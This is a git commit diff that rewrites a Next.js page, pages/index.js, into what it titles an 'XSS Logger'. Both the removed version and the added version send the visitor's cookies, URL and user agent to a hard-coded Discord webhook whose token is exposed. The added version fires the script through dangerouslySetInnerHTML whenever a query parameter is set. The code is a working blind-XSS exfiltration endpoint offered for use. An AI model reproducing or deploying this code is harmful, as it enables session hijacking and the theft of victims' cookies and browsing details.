181609b8de8e492a20efcc20908fb4ad437315be
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-07-29 07:37:11 +0330

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -1,42 +1,33 @@
-import Head from 'next/head'
-import { useEffect } from 'react'
-import Header from '@components/Header'
-import Footer from '@components/Footer'
+export async function getServerSideProps(context) {
+  const data = context.query.data || null;
+  return {
+    props: { data }, // 
+  };
+}
 
-export default function Home() {
-  useEffect(() => {
-    const webhook = "https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I";
-
-    const payload = {
-      content: `📢 Blind XSS Triggered!
-🌐 URL: ${window.location.href}
-🍪 Cookies: ${document.cookie}
-🧠 User-Agent: ${navigator.userAgent}`,
-    };
-
-    fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-  }, []);
-
+export default function Home({ data }) {
   return (
-    <div className="container">
-      <Head>
-        <title>Next.js Starter!</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
-
-      <main>
-        <Header title="Welcome to my app!" />
-        <p className="description">
-          Get started by editing <code>pages/index.js</code>
-        </p>
-      </main>
-
-      <Footer />
-    </div>
-  )
+    <html>
+      <head>
+        <title>XSS Logger</title>
+      </head>
+      <body>
+        <h1>Hi</h1>
+        {data && (
+          <script dangerouslySetInnerHTML={{
+            __html: `
+              fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                  content: "Blind XSS Triggered!\\nURL: " + window.location.href + "\\nCookies: " + document.cookie + "\\nUA: " + navigator.userAgent
+                })
+              });
+            `
+          }} />
+        )}
+      </body>
+    </html>
+  );
 }
 
